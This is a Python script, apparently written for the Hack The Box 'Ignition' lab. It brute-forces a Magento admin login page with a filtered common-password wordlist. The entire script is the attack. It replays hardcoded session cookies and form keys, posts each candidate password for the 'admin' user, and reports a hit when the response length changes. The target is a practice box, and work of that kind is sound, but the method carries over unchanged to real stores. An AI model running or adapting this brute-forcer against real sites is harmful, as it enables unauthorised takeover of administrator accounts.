import requests
import re

def poss_passwds(file):
    # Open and read the wordlist in the RIGHT way.
    f = open(file, 'r').read()
    words = f.split("\n")

    # Search the matching words for password requirements.
    word_str = " ".join(words)
    an = re.findall(r'\b(?=[^\W\d_]*\d)(?=\d*[^\W\d_])[^\W_]{8,}\b', word_str) 

    # Write and close the output file
    f_out = open("/home/kali/Desktop/Github/Boxes/Hack The Box/Very Easy/Ignition/script/pass.txt", 'w')
    for a in an:
        f_out.write("{}\n".format(a))

    f_out.close()

    return an


def pass_check():

    URL = "http://ignition.htb/admin"

    cookies =  {
        "admin" : "3np7s9uifrjv575etm8dj3sij6", # change this every time a session expires
        "form_key" : "a8KqyJGKzgefITzg",
        "mage-cache-storage" : "{}",
        "mage-cache-storage-section-invalidation" : "%{}",
        "mage-messages" : "",
        "recently_viewed_product" : "{}",
        "recently_viewed_product_previous" : "{}",
        "recently_compared_product" : "{}",
        "recently_compared_product_previous": "{}",
        "product_data_storage" : "{}",
        "PHPSESSID" : "tfjohpqo93kj0favl66jga0917",
        "mage-cache-sessid" : "true",
    }

    # input file supplied for 
    passwds = poss_passwds("/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt")
    # print(passwds)
    
    data = {
            "form_key" : "O1NLOOMk2RYlLYgh", # change this every time a session expires
            "login[username]" : "admin",
            "login[password]": passwds[0],
        }

    res = requests.post(URL, data=data, cookies=cookies)
    
    k=len(res.content)

    print(k)

    # the main loop
    for passwd in passwds[1:]:
        data = {
            "form_key" : "8THV9uvgYUrc6l1T",
            "login[username]" : "admin",
            "login[password]": passwd,
        }
        
        res = requests.post(URL, data=data, cookies=cookies)
    
        if len(res.content) != k:
            print("Password found as {}".format(passwd))
            break
        else:
            print("Another password tried as {}".format(passwd))

def main():
    pass_check()

if __name__=="__main__":
    main()